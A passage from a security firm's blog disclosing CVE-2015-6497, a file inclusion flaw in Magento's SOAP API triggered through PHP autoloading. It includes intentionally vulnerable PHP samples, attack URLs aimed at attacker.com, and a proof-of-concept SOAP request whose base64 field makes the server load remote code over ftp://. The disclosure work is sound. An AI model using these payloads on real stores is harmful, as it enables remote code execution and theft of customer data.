* [Google Plus One](https://blog.mindedsecurity.com/search/label/Google%20Plus%20One)
  (
  1
  )
* [google security](https://blog.mindedsecurity.com/search/label/google%20security)
  (
  1
  )
* [Http Parameter Pollution](https://blog.mindedsecurity.com/search/label/Http%20Parameter%20Pollution)
  (
  2
  )
* [Http Request Splitting](https://blog.mindedsecurity.com/search/label/Http%20Request%20Splitting)
  (
  1
  )
* [Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
  (
  2
  )
* [innovation](https://blog.mindedsecurity.com/search/label/innovation)
  (
  2
  )
* [intruder](https://blog.mindedsecurity.com/search/label/intruder)
  (
  1
  )
* [iOS](https://blog.mindedsecurity.com/search/label/iOS)
  (
  2
  )
* [iOS Security](https://blog.mindedsecurity.com/search/label/iOS%20Security)
  (
  7
  )
* [IoT](https://blog.mindedsecurity.com/search/label/IoT)
  (
  2
  )
* [ISO21434](https://blog.mindedsecurity.com/search/label/ISO21434)
  (
  1
  )
* [J2EE](https://blog.mindedsecurity.com/search/label/J2EE)
  (
  1
  )
* [Java](https://blog.mindedsecurity.com/search/label/Java)
  (
  5
  )
* [Java Faces](https://blog.mindedsecurity.com/search/label/Java%20Faces)
  (
  1
  )
* [Java Security](https://blog.mindedsecurity.com/search/label/Java%20Security)
  (
  2
  )
* [javascript](https://blog.mindedsecurity.com/search/label/javascript)
  (
  4
  )
* [JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)
  (
  2
  )
* [JNLP Security](https://blog.mindedsecurity.com/search/label/JNLP%20Security)
  (
  1
  )
* [jQuery](https://blog.mindedsecurity.com/search/label/jQuery)
  (
  2
  )
* [JSON](https://blog.mindedsecurity.com/search/label/JSON)
  (
  1
  )
* [Libraries Security](https://blog.mindedsecurity.com/search/label/Libraries%20Security)
  (
  1
  )
* [Liferay](https://blog.mindedsecurity.com/search/label/Liferay)
  (
  1
  )
* [Linkedin.com](https://blog.mindedsecurity.com/search/label/Linkedin.com)
  (
  1
  )
* [Log4J](https://blog.mindedsecurity.com/search/label/Log4J)
  (
  1
  )
* [Magento](https://blog.mindedsecurity.com/search/label/Magento)
  (
  1
  )
* [malware](https://blog.mindedsecurity.com/search/label/malware)
  (
  9
  )
* [malware detector](https://blog.mindedsecurity.com/search/label/malware%20detector)
  (
  1
  )
* [MAPT](https://blog.mindedsecurity.com/search/label/MAPT)
  (
  4
  )
* [maxthon](https://blog.mindedsecurity.com/search/label/maxthon)
  (
  1
  )
* [microservices](https://blog.mindedsecurity.com/search/label/microservices)
  (
  1
  )
* [MitM](https://blog.mindedsecurity.com/search/label/MitM)
  (
  2
  )
* [Mobile](https://blog.mindedsecurity.com/search/label/Mobile)
  (
  5
  )
* [Mobile Security](https://blog.mindedsecurity.com/search/label/Mobile%20Security)
  (
  4
  )
* [MSTG](https://blog.mindedsecurity.com/search/label/MSTG)
  (
  3
  )
* [mvc](https://blog.mindedsecurity.com/search/label/mvc)
  (
  1
  )
* [Obfuscation](https://blog.mindedsecurity.com/search/label/Obfuscation)
  (
  3
  )
* [Omniture](https://blog.mindedsecurity.com/search/label/Omniture)
  (
  2
  )
* [Oracle NetBeans](https://blog.mindedsecurity.com/search/label/Oracle%20NetBeans)
  (
  1
  )
* [OWASP](https://blog.mindedsecurity.com/search/label/OWASP)
  (
  6
  )
* [OWASP 5D](https://blog.mindedsecurity.com/search/label/OWASP%205D)
  (
  2
  )
* [OWASP SAMM](https://blog.mindedsecurity.com/search/label/OWASP%20SAMM)
  (
  2
  )
* [OWASP Summit](https://blog.mindedsecurity.com/search/label/OWASP%20Summit)
  (
  1
  )
* [OWASP Top Ten](https://blog.mindedsecurity.com/search/label/OWASP%20Top%20Ten)
  (
  3
  )
* [p2p encryption](https://blog.mindedsecurity.com/search/label/p2p%20encryption)
  (
  1
  )
* [path traversal](https://blog.mindedsecurity.com/search/label/path%20traversal)
  (
  3
  )
* [peer to peer encryption](https://blog.mindedsecurity.com/search/label/peer%20to%20peer%20encryption)
  (
  1
  )
* [Polyglots](https://blog.mindedsecurity.com/search/label/Polyglots)
  (
  1
  )
* [Primefaces](https://blog.mindedsecurity.com/search/label/Primefaces)
  (
  1
  )
* [privacy](https://blog.mindedsecurity.com/search/label/privacy)
  (
  1
  )
* [puffin](https://blog.mindedsecurity.com/search/label/puffin)
  (
  1
  )
* [RAT](https://blog.mindedsecurity.com/search/label/RAT)
  (
  1
  )
* [RAT WARS](https://blog.mindedsecurity.com/search/label/RAT%20WARS)
  (
  1
  )
* [RATDET](https://blog.mindedsecurity.com/search/label/RATDET)
  (
  1
  )
* [RATWARS](https://blog.mindedsecurity.com/search/label/RATWARS)
  (
  1
  )
* [RDS](https://blog.mindedsecurity.com/search/label/RDS)
  (
  1
  )
* [Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)
  (
  3
  )
* [remote working](https://blog.mindedsecurity.com/search/label/remote%20working)
  (
  1
  )
* [reverse engineering](https://blog.mindedsecurity.com/search/label/reverse%20engineering)
  (
  1
  )
* [Same Origin Policy](https://blog.mindedsecurity.com/search/label/Same%20Origin%20Policy)
  (
  1
  )
* [sanitization](https://blog.mindedsecurity.com/search/label/sanitization)
  (
  1
  )
* [sast](https://blog.mindedsecurity.com/search/label/sast)
  (
  3
  )
* [Screen Control](https://blog.mindedsecurity.com/search/label/Screen%20Control)
  (
  1
  )
* [screenshot security](https://blog.mindedsecurity.com/search/label/screenshot%20security)
  (
  2
  )
* [SDL](https://blog.mindedsecurity.com/search/label/SDL)
  (
  2
  )
* [security](https://blog.mindedsecurity.com/search/label/security)
  (
  2
  )
* [security tools](https://blog.mindedsecurity.com/search/label/security%20tools)
  (
  1
  )
* [semgrep](https://blog.mindedsecurity.com/search/label/semgrep)
  (
  3
  )
* [Sharepoint](https://blog.mindedsecurity.com/search/label/Sharepoint)
  (
  1
  )
* [slack](https://blog.mindedsecurity.com/search/label/slack)
  (
  1
  )
* [Software Security Governance](https://blog.mindedsecurity.com/search/label/Software%20Security%20Governance)
  (
  1
  )
* [source code](https://blog.mindedsecurity.com/search/label/source%20code)
  (
  1
  )
* [Spring MVC](https://blog.mindedsecurity.com/search/label/Spring%20MVC)
  (
  1
  )
* [SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)
  (
  1
  )
* [SSL](https://blog.mindedsecurity.com/search/label/SSL)
  (
  2
  )
* [static analysis](https://blog.mindedsecurity.com/search/label/static%20analysis)
  (
  1
  )
* [Stored DOM Based XSS](https://blog.mindedsecurity.com/search/label/Stored%20DOM%20Based%20XSS)
  (
  1
  )
* [STRATEGY](https://blog.mindedsecurity.com/search/label/STRATEGY)
  (
  1
  )
* [superfish](https://blog.mindedsecurity.com/search/label/superfish)
  (
  1
  )
* [Supply Chain Security](https://blog.mindedsecurity.com/search/label/Supply%20Chain%20Security)
  (
  1
  )
* [SVG](https://blog.mindedsecurity.com/search/label/SVG)
  (
  1
  )
* [Swift](https://blog.mindedsecurity.com/search/label/Swift)
  (
  1
  )
* [TARA](https://blog.mindedsecurity.com/search/label/TARA)
  (
  1
  )
* [Telerik UI](https://blog.mindedsecurity.com/search/label/Telerik%20UI)
  (
  1
  )
* [TESTABLE](https://blog.mindedsecurity.com/search/label/TESTABLE)
  (
  1
  )
* [testing](https://blog.mindedsecurity.com/search/label/testing)
  (
  1
  )
* [Threat Modeling](https://blog.mindedsecurity.com/search/label/Threat%20Modeling)
  (
  1
  )
* [twitter](https://blog.mindedsecurity.com/search/label/twitter)
  (
  1
  )
* [UNECE R155](https://blog.mindedsecurity.com/search/label/UNECE%20R155)
  (
  1
  )
* [unzip directory traversal](https://blog.mindedsecurity.com/search/label/unzip%20directory%20traversal)
  (
  1
  )
* [UPnP](https://blog.mindedsecurity.com/search/label/UPnP)
  (
  2
  )
* [validation](https://blog.mindedsecurity.com/search/label/validation)
  (
  1
  )
* [Vulnerabilities statistics](https://blog.mindedsecurity.com/search/label/Vulnerabilities%20statistics)
  (
  1
  )
* [WAF](https://blog.mindedsecurity.com/search/label/WAF)
  (
  1
  )
* [WAPT](https://blog.mindedsecurity.com/search/label/WAPT)
  (
  1
  )
* [Web Application Firewall](https://blog.mindedsecurity.com/search/label/Web%20Application%20Firewall)
  (
  1
  )
* [web architecture security](https://blog.mindedsecurity.com/search/label/web%20architecture%20security)
  (
  1
  )
* [Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
  (
  23
  )
* [web cache](https://blog.mindedsecurity.com/search/label/web%20cache)
  (
  1
  )
* [web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
  (
  4
  )
* [Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)
  (
  23
  )
* [Windows Phone Security](https://blog.mindedsecurity.com/search/label/Windows%20Phone%20Security)
  (
  1
  )
* [WWeb Security](https://blog.mindedsecurity.com/search/label/WWeb%20Security)
  (
  2
  )
* [zeus p2p](https://blog.mindedsecurity.com/search/label/zeus%20p2p)
  (
  3
  )

## Blog Archive

* [May](https://blog.mindedsecurity.com/2024/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2024/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2024/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2023/10/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2023/06/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2023/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2023/02/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2022/07/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2021/12/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2021/08/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2021/05/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2021/02/)
  (
  1
  )
* [January](https://blog.mindedsecurity.com/2021/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2020/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2020/10/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2020/07/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2020/06/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2020/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2020/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2020/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2020/02/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2019/04/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2018/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2018/09/)
  (
  3
  )
* [July](https://blog.mindedsecurity.com/2018/07/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2018/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2018/04/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2017/11/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2017/06/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2016/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2016/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2015/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2015/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2015/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2015/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2015/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2015/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2015/03/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2015/02/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2014/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2014/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2014/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2013/10/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2013/04/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2013/02/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2012/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2012/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2012/09/)
  (
  4
  )
* [June](https://blog.mindedsecurity.com/2012/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2011/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2011/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2011/08/)
  (
  2
  )
* [July](https://blog.mindedsecurity.com/2011/07/)
  (
  2
  )
* [May](https://blog.mindedsecurity.com/2011/05/)
  (
  2
  )
* [April](https://blog.mindedsecurity.com/2011/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2011/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2010/10/)
  (
  8
  )
* [September](https://blog.mindedsecurity.com/2010/09/)
  (
  3
  )
* [August](https://blog.mindedsecurity.com/2010/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2010/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2010/04/)
  (
  4
  )
* [March](https://blog.mindedsecurity.com/2010/03/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2009/12/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2009/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2009/10/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2009/05/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2009/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2009/01/)
  (
  1
  )

####

Minded Security was established in Italy in 2007

with a focus on supporting businesses and

organizations to build secure products
 and services.

##### Services

* Training
* Testing
* Consulting
* Request a brochure

##### Information

* The Company
* blueclosure
* AMT – Banking Malware Detector
* Contact us
* Privacy Policy

##### Newsletter

©2015 Minded Security S.r.l. The Software Security Company - VAT IT05756380480

[Back to top](#top)



=== Content from blog.mindedsecurity.com_0926d42a_20250126_020847.html ===


[Subscribe our newsletter](https://mindedsecurity.com/newsletter)

[Minded Security](https://mindedsecurity.com)

* Industry
  + [Automotive/Maritime](https://mindedsecurity.com/industry/automotive-maritime/ "Automotive/Maritime")
  + [Financial](https://mindedsecurity.com/industry/financial/ "Financial")
  + [GDO](https://mindedsecurity.com/industry/gdo/ "GDO")
  + [Industrial Control Systems](https://mindedsecurity.com/industry/industrial-control-systems/ "Industrial Control Systems")
  + [IoT Security](https://mindedsecurity.com/industry/iot-security/ "IoT Security")
  + [Healthcare](https://mindedsecurity.com/industry/healthcare/ "Healthcare")
  + [Government](https://mindedsecurity.com/industry/government/ "Government")
* [Services](https://mindedsecurity.com/our-services/ "Services")
  + [Training](https://mindedsecurity.com/our-services/training/ "Training")
    - [Security Hackaton](https://mindedsecurity.com/services/training/security-hackaton/ "Security Hackaton")
    - [Advanced On-site Training](https://mindedsecurity.com/services/training/advanced-on-site-training/ "Advanced On-site Training")
    - [BlueClosure Training](https://mindedsecurity.com/services/training/blueclosure-training/ "BlueClosure Training")
    - [High Level Training](https://mindedsecurity.com/services/training/high-level-training/ "High Level Training")
    - [Webinar](https://mindedsecurity.com/services/training/webinar/ "Webinar")
  + [Testing](https://mindedsecurity.com/our-services/testing/ "Testing")
    - [Manual Secure Code Review](https://mindedsecurity.com/services/testing/manual-secure-code-review/ "Manual Secure Code Review")
    - [Manual WAPT](https://mindedsecurity.com/services/testing/manual-wapt/ "Manual WAPT")
    - [Cloud Security Testing](https://mindedsecurity.com/services/testing/cloud-security-testing/ "Cloud Security Testing")
    - [IoT Security](https://mindedsecurity.com/services/testing/iot-security/ "IoT Security")
    - [API Security](https://mindedsecurity.com/services/testing/api-security/ "API Security")
    - [Mobile Security Assessment](https://mindedsecurity.com/services/testing/mobile-security-assessment/ "Mobile Security Assessment")
    - [Client Side Assessment](https://mindedsecurity.com/services/testing/client-side-assessment/ "Client Side Assessment")
  + [Consulting](https://mindedsecurity.com/our-services/consulting/ "Consulting")
    - [Software Security Advisory](https://mindedsecurity.com/services/consulting/software-security-advisory/ "Software Security Advisory")
    - [5D Framework](https://mindedsecurity.com/services/consulting/5d-framework/ "5D Framework")
    - [Threat Modeling](https://mindedsecurity.com/services/consulting/threat-modeling/ "Threat Modeling")
    - [Secure Design](https://mindedsecurity.com/services/consulting/secure-design/ "Secure Design")
    - [Secure Architecture Review](https://mindedsecurity.com/services/consulting/secure-architecture-review/ "Secure Architecture Review")
    - [Secure Coding Guidelines](https://mindedsecurity.com/services/consulting/secure-coding-guidelines/ "Secure Coding Guidelines")
    - [Fixing Support](https://mindedsecurity.com/services/consulting/fixing-support/ "Fixing Support")
    - [Outsourcing Development Governance](https://mindedsecurity.com/services/consulting/outsourcing-development-governance/ "Outsourcing Development Governance")
  + [Request a brochure](https://mindedsecurity.com/request-a-brochure/ "Request a brochure")
* Resources
  + [Blog](https://blog.mindedsecurity.com/ "Blog")
  + [News](https://mindedsecurity.com/category/news/ "News")
  + [Videos](https://mindedsecurity.com/videos/ "Videos")
  + [Research](https://mindedsecurity.com/research/ "Research")
  + [Advisories](https://mindedsecurity.com/research/advisories/ "Advisories")
* [About us](https://mindedsecurity.com/our-mission/ "About us")
  + [The Company](https://mindedsecurity.com/the-company/ "The Company")
  + [Contact us](https://mindedsecurity.com/contact-us/ "Contact us")
  + [Newsletter](https://mindedsecurity.com/newsletter/ "Newsletter")
  + [Jobs](https://mindedsecurity.com/jobs/ "Jobs")
  + [Privacy Policy](https://mindedsecurity.com/privacy-policy/ "Privacy Policy")

## IMQ Minded Security Blog

[skip to main](#main)  |
[skip to sidebar](#sidebar)

Showing posts with label **CVE-2015-6497**. [Show all posts](https://blog.mindedsecurity.com/)

Showing posts with label **CVE-2015-6497**. [Show all posts](https://blog.mindedsecurity.com/)

## Friday, September 11, 2015

# [Autoloaded File Inclusion in Magento SOAP API (SUPEE-6482)](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html)

This past February we reported an interesting and quite overlooked kind of vulnerability in the [Magento](http://magento.com/) web e-commerce platform. The vulnerability might allow an authenticated attacker to execute arbitrary code on the affected web stores, and this can lead to a complete compromise, including credit card information and personal data theft. We received the first reply from the Magento Security Team on June 22, 2015, stating that our submission was not eligible for the bug bounty program, because it was found to be invalid and not actionable. The reason for the rejection was that there are too many requirements to exploit the vulnerability, first of all it requires that Magento is running on outdated PHP versions, because this kind of vulnerability has been fixed in the PHP core engine at the beginning of 2014. However, as we will see in this post, there are still many websites out there using such outdated PHP versions. That should be one of the reasons why the Magento Security Team replied us on June 25, 2015, stating the following:
> *We were able to confirm your issue. Even though it requires knowing API credentials, it should not be possible to execute such actions. The PHP versions that are additionally vulnerable, while old are still used in popular distributions like RHEL 7.1.* *We will schedule fixing this issue for our next product release given lower priority. We will inform you regarding possible awards associated with this report.*

On August 4, 2015, a bundle of patches ([SUPEE-6482](http://magento.com/security/patches/supee-6482)) has been released by the Magento team, that resolved several security-related issues, including the one we reported in February. The same day Magento released new versions (Community Edition 1.9.2.1 and Enterprise Edition 1.14.2.1) that include SUPEE-6482 along with other security patches. On August 13, 2015, we requested a new CVE identifier for this vulnerability, and MITRE has assigned the name [CVE-2015-6497](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-6497) for it.

### **What is an "Autoloaded File Inclusion" vulnerability?**

This kind of vulnerability might affect PHP applications which uses an "exploitable" autoloading mechanism. The "[Autoloading Classes](http://php.net/manual/en/language.oop5.autoload.php)" feature has been introduced in PHP 5.0 with the magic function *\_\_autoload()* which is automatically called when your code references a class or interface that hasn’t been loaded yet. So, instead of including every needed class by hand, is it possible to register a function that gets called as soon as the code try to instantiate an unknown class. This function gets passed the unknown class name and is responsible for including the right file that contains the class definition. As an aside, starting from PHP 5.1.2 autoload-functions are usually registered via [*spl\_autoload\_register()*](http://php.net/manual/en/function.spl-autoload-register.php), which provides a more flexible alternative for autoloading classes. For this reason, using *\_\_autoload()* is discouraged and may be deprecated in the future. Here’s an example of an extremely basic *\_\_autoload()* implementation, which attempts to load the classes MyClass1 and MyClass2 from the files MyClass1.php and MyClass2.php respectively (it's taken from the official PHP documentation page):

```
<?php

 function __autoload($class_name) {
    include $class_name . '.php';
 }

 $obj  = new MyClass1();
 $obj2 = new MyClass2();

?>
```

While this feature is extremely useful and powerful, it might introduce potential local/remote file inclusion vulnerabilities when user-controlled input is used as a class name. Indeed, if an attacker can control the class name variable passed to an autoloading function, she could try to play around with it in order to include an arbitrary file and execute PHP code remotely. There are multiple ways to trigger the autoloader, the most obvious is class instantiation using the ***new*** operator. In addition to that, there are some PHP functions which can be considered as *sensitive sinks* for this kind of vulnerability. Here is an incomplete list:

* [class\_exists()](http://php.net/manual/en/function.class-exists.php)
* [interface\_exists()](http://php.net/manual/en/function.interface-exists.php)
* [method\_exists()](http://php.net/manual/en/function.method-exists.php)
* [property\_exists()](http://php.net/manual/en/function.property-exists.php)
* [is\_subclass\_of()](http://php.net/manual/en/function.is-subclass-of.php)
* ...

So, when user-controlled input (*tainted data*) enters one of these *sensitive sinks* there's a chance for the application to be vulnerable to "Autoloaded File Inclusion". Let's see a trivial example of vulnerable scripts:

```
<?php

 /* File: autoload.php */

 function __autoload($class_name) {
    include $class_name . '.php';
 }

?>
```

```
<?php

 /* File: vuln.php */

 require('autoload.php');

 if(isset($_GET['class']) && class_exists($_GET['class'])) {
    $obj = new $_GET['class'];
 } else {
    die('No class found');
 }

 /* Some code... */

?>
```

In this example an attacker controls a class name via the GET parameter "class", which is first used with the *class\_exists()* function (triggering the autoloader in case it is an unknown class) and then to instantiate a new object. This means that the attacker can control the *$class\_name* variable passed to the autoloader, therefore it could be possible to include arbitrary files from both local or remote resources by invoking URLs like these:

> **http://example.com/vuln.php?class=http://attacker.com/shell**
>
> **http://example.com/vuln.php?class=../../../tmp/cache/attacker\_controlled/file**

In the first case the autoloader will try to include and execute the PHP code located at *http://attacker.com/shell.php*, resulting in a Remote File Inclusion (RFI); while in the second case the autoloader will try to include and execute the PHP code located into the file */tmp/cache/attacker\_controlled/file.php*, resulting in a Local File Inclusion (LFI). Furthermore, in cases like this where the attacker controls the classname's prefix, in addition to http:// other [PHP wrappers](http://php.net/manual/en/wrappers.php) might be abused in order to execute arbitrary PHP code.

But... wait a moment! According to the [official documentation](http://php.net/manual/en/language.oop5.basic.php) *"a valid class name starts with a letter or underscore, followed by any number of letters, numbers, or underscores".* That means an attacker cannot include arbitrary files via class names because it should not be possible to e.g. use path traversal sequences (../../) through them. But here comes the problem: there was a [bug](https://bugs.php.net/bug.php?id=62789) in the PHP core which allowed to invoke class autoloaders with invalid class names. This bug has been solved in [January 2014](http://www.php.net/ChangeLog-5.php#5.4.24) with the release of PHP versions 5.4.24 and 5.5.8.

### **How many vulnerable PHP installs are out there?**

Well, the bug which might enable this kind of vulnerability has been fixed by the PHP team at the beginning of 2014. But is this enough to say this kind of vulnerability should not pose any security concern? Maybe not... At the end of 2014 has been published a [blog post](http://blog.ircmaxell.com/2014/12/php-install-statistics.html) showing that 78% of all PHP installs were not secure, meaning they had at least one known security vulnerability. Antony Ferrara, the author of that post, used the statistics data from [W3Techs](http://w3techs.com/) in order to come to that conclusion. Let's try to do the same with regards to the PHP installs affected by the autoloading bug. In other words, let's check how many PHP websites are using PHP versions before 5.4.24 or 5.5.8.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3EM7BJaEsfNVf5ER6me7RRHTJv_OcYNGxTPNSy9eSz_sK4Q2k0BVlc5IHcUnCTR7s5uDsUtPLERaajRpFqJenNa_HItbVojHmAEMQH9Qk-4-Bfq7oyk3D3_0sM2LnGpQP3i-TxQBeteY/s400/php5.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3EM7BJaEsfNVf5ER6me7RRHTJv_OcYNGxTPNSy9eSz_sK4Q2k0BVlc5IHcUnCTR7s5uDsUtPLERaajRpFqJenNa_HItbVojHmAEMQH9Qk-4-Bfq7oyk3D3_0sM2LnGpQP3i-TxQBeteY/s1600/php5.png)

The above table has been retrieved from the [PHP version 5](http://w3techs.com/technologies/details/pl-php/5/all) usage statistics page from W3Techs, as of September 10, 2015. It shows that at least **54.2%** of websites using PHP are affected by the autoloading bug (38.5% is using PHP 5.3, 14.7% is using PHP 5.2 and 1% is using PHP 5.1). Next step is to see how many websites are using vulnerable PHP 5.4.x and 5.5.x versions. The usage statistics page for [subversions of PHP 5.4](http://w3techs.com/technologies/details/pl-php/5.4/all) show that **12.7%** of websites using PHP are running a version before 5.4.24, while the usage statistics page for [subversions of PHP 5.5](http://w3techs.com/technologies/details/pl-php/5.5/all) show that **3.5%** of websites using PHP are running a version before 5.5.8. Overall, this means that **70.4%** of websites using PHP are affected by the autoloading bug. Roughly speaking, considering that according to the official website Magento powers more than 240,000 online shops, this could mean that over 150,000 websites powered by Magento might be affected by [CVE-2015-6497](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-6497).

###

### **Technical description of the****vulnerability**

The vulnerability is caused by the *Mage\_Catalog\_Model\_Product\_Api\_V2::create()* method, which handles the "[catalogProductCreate](http://devdocs.magento.com/guides/m1x/api/soap/catalog/catalogProduct/catalog_product.create.html)" SOAP API call. The vulnerable code is located into the /app/code/core/Mage/Catalog/Model/Product/Api/V2.php script:

```
    public function create($type, $set, $sku, $productData, $store = null)
    {
        if (!$type || !$set || !$sku) {
            $this->_fault('data_invalid');
        }

        $this->_checkProductTypeExists($type);
        $this->_checkProductAttributeSet($set);

        /** @var $product Mage_Catalog_Model_Product */
        $product = Mage::getModel('catalog/product');
        $product->setStoreId($this->_getStoreId($store))
            ->setAttributeSetId($set)
            ->setTypeId($type)
            ->setSku($sku);

        if (!property_exists($productData, 'stock_data')) {
            //Set default stock_data if not exist in product data
            $_stockData = array('use_config_manage_stock' => 0);
            $product->setStockData($_stockData);
        }

```

This method expects the $productData parameter to be an array (in form of a stdClass object) and uses the *property\_exists()* function with it. However, an attacker can manipulate a SOAP request arbitrarily and send the $productData parameter in form of a string. In this case, if the string passed to the *property\_exists()* function is an unknown class, any registered autloader function will be triggered. When the *property\_exists()* function is called there's only one autoloader function registered, that is the *Varien\_Autoload::autoload()* method:

```
    public function autoload($class)
    {
        if ($this->_collectClasses) {
            $this->_arrLoadedClasses[self::$_scope][] = $class;
        }
        if ($this->_isIncludePathDefined) {
            $classFile =  COMPILER_INCLUDE_PATH . DIRECTORY_SEPARATOR . $class;
        } else {
            $classFile = str_replace(' ', DIRECTORY_SEPARATOR, ucwords(str_replace('_', ' ', $class)));
        }
        $classFile.= '.php';
        //echo $classFile;die();
        return include $classFile;
    }

```

In such a scenario, the $class parameter automatically passed to this method is exactly the same string value sent through the $productData parameter from the SOAP request, which after some replacementes and a ".php" string appended to it, is being used in a call to the *[include()](http://php.net/manual/it/function.include.php)* function. This may result in an arbitrary file inclusion (both from local or remote resources) and could be exploited to include and execute arbitrary PHP code. There are some conditions which should be met in order to exploit this vulnerability:

* an API user account with privileges to create a catalog product is required;
* in order to include arbitrary files from remote locations, Magento should run on PHP before
  5.4.24 or 5.5.8, because such versions have fixed the issue related to invalid class names
  in the autoloading process;
* in order to include arbitrary files from remote locations the "allow\_url\_include" directive
  must be set to On;
* in case the allow\_url\_include directive is set to Off it might still be possible to include
  files from remote locations using the ssh2.sftp:// wrapper (which requires the SSH2 extension
  to be installed) or execute arbitrary OS commands leveraging the expect:// wrapper (which
  requires the Expect extension to be installed).

NOTE: if Magento is running on PHP version after 5.4.23 or 5.5.7 the vulnerability
could still be exploited by including a local file with a .php extension (something like /tmp/test.php).
If Magento is running on PHP before 5.3.4 the vulnerability could be exploited to include arbitrary
local files with any extension (e.g. a session file containing malicious PHP code injected by the
attacker) because NULL bytes are allowed within the path (see [CVE-2006-7243](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2006-7243)).

### **Proof of Concept**

Once logged in with valid API credentials, an attacker could send a SOAP request like the following in order to try to exploit the vulnerability:
> POST /magento/index.php/api/v2\_soap HTTP/1.0
>
> Host: localhost
>
> Content-Length: 804
>
> Connection: close
>
>
>
> <?xml version="1.0" encoding="UTF-8"?>
>
> <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:Magento" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
>
> <SOAP-ENV:Body>
>
> <ns1:catalogProductCreate>
>
> <sessionId xsi:type="xsd:string">VALID\_SESSION</sessionId>
>
> <type xsi:type="xsd:string">simple</type>
>
> <set xsi:type="xsd:string">4</set>
>
> <sku xsi:type="xsd:string">test</sku>
>
> <productData xsi:type="xsd:base64Binary">ZnRwOi8vYXR0YWNrZXI6cGFzc3dvcmRAYXR0YWNrZXJfc2VydmVyLmNvbS9ob21lL2F0dGFja2VyL2V2aWw=</productData>
>
> <storeView xsi:nil="true"/>
>
> </ns1:catalogProductCreate>
>
> </SOAP-ENV:Body>
>
> </SOAP-ENV:Envelope>

The  "productData" parameter has been encoded in base64 within the SOAP request, and the decoded string is the following:

> **ftp://attacker:password@attacker\_server.com/home/attacker/evil**

This means that leveraging the [ftp:// wrapper](http://php.net/manual/en/wrappers.ftp.php), an attacker might be able to force Magento to load and execute malicious code from a FTP server under its control. In this example, the attacker only has to put the malicious code under /home/attacker/evil.php. However, as we said before, other PHP wrappers might be abused, potentially leading to direct arbitrary PHP code execution.

By

